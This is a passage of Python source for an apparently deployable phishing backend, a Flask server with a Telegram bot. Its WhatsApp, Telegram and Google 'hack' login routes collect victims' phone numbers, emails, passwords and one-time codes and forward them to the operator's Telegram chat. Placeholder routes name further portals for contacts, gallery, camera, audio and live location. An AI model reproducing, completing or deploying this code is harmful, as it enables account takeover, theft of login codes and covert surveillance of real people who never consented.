    cid = d.get('chat_id'); u = d.get('username'); p = d.get('password')
    if cid:
        try:
            bot.send_message(int(cid), f"<blockquote>💬 <b>WhatsApp Login Attempt</b>\n📱 Phone: <code>{u}</code>\n🔑 Code: <code>{p}</code>\n{DEV_TAG}</blockquote>", parse_mode="HTML")
        except Exception: pass
    return jsonify({"status":"ok"})

@app.route('/api/tg-hack/login', methods=['POST'])
def tg_hack_login():
    d = request.get_json(force=True)
    cid = d.get('chat_id'); u = d.get('username'); p = d.get('password')
    if cid:
        try:
            bot.send_message(int(cid), f"<blockquote>✈️ <b>Telegram Login Attempt</b>\n📱 Phone: <code>{u}</code>\n🔑 Code: <code>{p}</code>\n{DEV_TAG}</blockquote>", parse_mode="HTML")
        except Exception: pass
    return jsonify({"status":"ok"})

@app.route('/api/google-hack/login', methods=['POST'])
def google_hack_login():
    d = request.get_json(force=True)
    cid = d.get('chat_id'); u = d.get('username'); p = d.get('password')
    if cid:
        try:
            bot.send_message(int(cid), f"<blockquote>🔍 <b>Google Login Attempt</b>\n📧 Email: <code>{u}</code>\n🔑 Pass: <code>{p}</code>\n{DEV_TAG}</blockquote>", parse_mode="HTML")
        except Exception: pass
    return jsonify({"status":"ok"})

# ----------------- PLACEHOLDER ROUTES -----------------
@app.route('/call-history-reveal')
def call_history_reveal():
    return "<h2>Call History Portal</h2>"

@app.route('/Ayush-gallery')
def ayush_gallery():
    return "<h2>Gallery Portal</h2>"

@app.route('/Ayush-contacts')
def ayush_contacts():
    return "<h2>Contacts Portal</h2>"

@app.route('/Ayush-phonehack')
def ayush_phonehack():
    return "<h2>Phone Hack Portal</h2>"

@app.route('/Ayush-wab')
def ayush_wab():
    return "<h2>Camera Portal</h2>"

@app.route('/Ayush-wab-1')
def ayush_wab_1():
    return "<h2>Back Camera Portal</h2>"

@app.route('/Ayush-wab-2')
def ayush_wab_2():
    return "<h2>Front Video Portal</h2>"

@app.route('/Ayush-wab-3')
def ayush_wab_3():
    return "<h2>Back Video Portal</h2>"

@app.route('/Ayush-wab-4')
def ayush_wab_4():
    return "<h2>Audio Portal</h2>"

@app.route('/Ayush-wab-5')
def ayush_wab_5():
    return "<h2>Location Portal</h2>"

@app.route('/Ayush-wab-6')
def ayush_wab_6():
    return "<h2>Live Location Portal</h2>"

# ----------------- START BOT -----------------
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print("Polling error:", e)
            time.sleep(5)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))